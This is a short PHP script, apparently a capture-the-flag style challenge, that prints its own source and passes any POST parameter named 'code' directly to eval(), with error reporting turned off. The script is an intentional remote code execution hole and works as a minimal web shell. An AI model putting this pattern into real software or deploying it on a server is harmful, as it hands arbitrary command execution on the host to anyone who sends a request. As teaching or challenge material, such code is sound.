<?php
error_reporting(0);
highlight_file(__FILE__);
$code = $_POST['code'];
eval($code);
?>